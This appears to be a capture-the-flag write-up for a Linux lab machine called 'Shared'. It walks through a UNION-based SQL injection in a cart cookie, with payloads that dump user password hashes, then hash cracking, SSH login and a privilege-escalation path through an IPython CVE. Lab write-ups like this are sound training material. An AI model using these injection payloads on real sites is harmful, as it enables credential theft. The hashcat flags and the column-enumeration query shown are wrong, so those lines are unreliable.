# Shared
### Medium linux box

##### Start with an nmap scan:
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FvunymQaGuIELhAVfpFNU%2Fnmapscan.jpg?alt=media&token=36d6168c-845f-4150-be68-ecfc1a51dd68 "nmap results")

##### Visit port 80 and navigate to the checkout page. There's a URL encoded cookie named `custom_cart=`. Decode the cookie and note it's format: `<Item>:<Quantity>`

##### The cookie ended up being vulnerable to SQLi. Portswigger's sqli courses helped a lot here. URL encode the payload.

#### `' UNION SELECT 1 -- -` No values
#### `' UNION SELECT 1,2 -- -` No values
#### `' UNION SELECT 1,2,3 -- -` Values are reflected!
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FiMA8il58YnoiSfSBNhwv%2FBURPCOOKIESQL.jpg?alt=media&token=ca2f7673-855a-4e73-9e13-626d989795d6 ")

### SQLi payloads:
##### Find current database:
#### `' UNION SELECT 1,database(),3 -- -`
##### Get tables in checkout database:
#### `'UNION SELECT 1,group_concat(table_name),3 from information_schema.tables WHERE table_schema='checkout' -- -`
##### Enumerate columns in user table from the checkout database:
#### `' UNION SELECT 1,group_concat(column_name),3 from information_schema.tables WHERE table_schema='user' -- -`
##### Get values from the user table:
#### `' UNION SELECT 1,group_concat(id, ':', password),3 from checkout.user -- -`

##### Finally, we get a hash that we can crack! I used hashcat
#### `hashcat -a -0 -m -0 <hash> <wordlist>`

##### ssh into the james_mason account with the cracked password

### Privilege Escalation
##### Transfer pspy64 and linpeas to the machine to see running processes and find sensitive files.
##### We find ipython and an interesting file, `/opt/scripts_review`. It reveals a cronjob being every minute by `dan_smith`
```bash
/bin/sh -c
/usr/bin/pkill ipython;
cd opt/scripts review/ && /usr/local/bin/ipython
```
##### Looking more into ipython, I found CVE-2022-21699. "Arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another"
